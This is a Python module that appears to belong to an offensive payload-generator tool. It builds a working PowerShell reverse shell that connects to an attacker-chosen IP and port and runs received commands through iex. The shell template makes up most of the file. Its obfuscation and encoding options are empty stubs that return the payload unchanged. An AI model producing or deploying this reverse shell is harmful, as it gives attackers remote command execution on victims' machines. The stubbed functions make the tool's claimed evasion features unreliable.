from .base_generator import BaseGenerator
import random

class PowerShellGenerator(BaseGenerator):
    """PowerShell reverse shell generator"""
    
    def generate(self, ip: str, port: int, **kwargs) -> str:
        obfuscate = kwargs.get('obfuscate', False)
        encode = kwargs.get('encode', None)
        
        template = """
$client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()}};
$client.Close()
"""
        payload = template.replace("{IP}", ip).replace("{PORT}", str(port))
        
        if obfuscate:
            payload = self._obfuscate_payload(payload)
        
        if encode:
            payload = self._encode_payload(payload, encode)
            
        return self.add_comments(payload, 'powershell')
    
    def _obfuscate_payload(self, payload: str) -> str:
        """Obfuscate PowerShell payload"""
        # Implementation of obfuscation logic
        return payload
    
    def _encode_payload(self, payload: str, method: str) -> str:
        """Encode PowerShell payload"""
        # Implementation of encoding logic
        return payload